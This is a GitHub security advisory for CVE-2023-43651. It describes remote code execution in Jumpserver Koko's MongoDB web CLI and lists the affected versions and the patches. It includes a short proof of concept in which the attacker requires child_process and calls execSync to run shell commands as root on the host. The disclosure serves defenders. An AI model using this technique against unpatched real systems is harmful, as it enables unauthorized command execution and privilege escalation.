# [M] Jumpserver Koko vulnerable to remote code execution on the host system via MongoDB shell 

## Summary
Severity: Medium
Advisory: GHSA-4r5x-x283-wm96
CVE: CVE-2023-43651
CWE: CWE-94
Ecosystem: Go
CVSS: CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:L/I:L/A:H (CVSS_V3)
Published: 2023-10-24
Source: https://github.com/advisories/GHSA-4r5x-x283-wm96
Type: github-advisory

## Affected
- Go: `github.com/jumpserver/koko` — affected >=2.0.0 <2.28.20
- Go: `github.com/jumpserver/koko` — affected >=3.0.0 <3.7.1

## Details
### Impact

An authenticated user can exploit a vulnerability in MongoDB sessions to execute arbitrary commands, leading to remote code execution. This vulnerability may further be leveraged to gain root privileges on the host system.

### Details
Through the WEB CLI interface provided by koko, a user logs into the authorized mongoDB database and exploits the MongoDB session to execute arbitrary commands.

```
admin> const { execSync } = require("child_process")
admin> console.log(execSync("id; hostname;").toString())
uid=0(root) gid=0(root) groups=0(root)
jms_koko
admin> 
```

### Patches
Safe versions: 
- v2.28.20
- v3.7.1 

### Workarounds
It is recommended to upgrade the safe versions.

After upgrade, you can use the same method to check whether the vulnerability is fixed.
```
admin> console.log(execSync("id; hostname;").toString())
/bin/sh: line 1: /bin/hostname: Permission denied
```

### References
Thanks for **Oskar Zeino-Mahmalat** of [Sonar](https://sonarsource.com/) found and report this vulnerability

## References
- https://github.com/jumpserver/jumpserver/security/advisories/GHSA-4r5x-x283-wm96
- https://nvd.nist.gov/vuln/detail/CVE-2023-43651
- https://github.com/jumpserver/koko/commit/7d80db95d17c8f42bdf50260dfc21dc2bd0452c2
- https://github.com/jumpserver/koko/commit/857f8b9e41f0930dc6190a35d8601fffa5e884e7
- https://github.com/jumpserver/koko
